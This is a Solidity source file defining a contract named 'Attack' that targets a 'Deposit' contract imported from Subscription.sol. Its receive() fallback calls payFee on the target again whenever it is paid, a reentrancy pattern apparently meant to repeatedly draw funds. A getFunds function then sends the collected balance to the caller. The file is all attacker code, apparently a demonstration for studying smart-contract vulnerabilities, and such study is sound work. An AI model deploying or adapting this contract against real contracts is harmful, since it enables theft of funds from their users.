// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Subscription.sol";


contract Attack {
    Deposit depos;

    constructor(address payable _addr) public {
        depos = Deposit(_addr);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getFunds() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {
        depos.payFee(msg.sender);
    }
}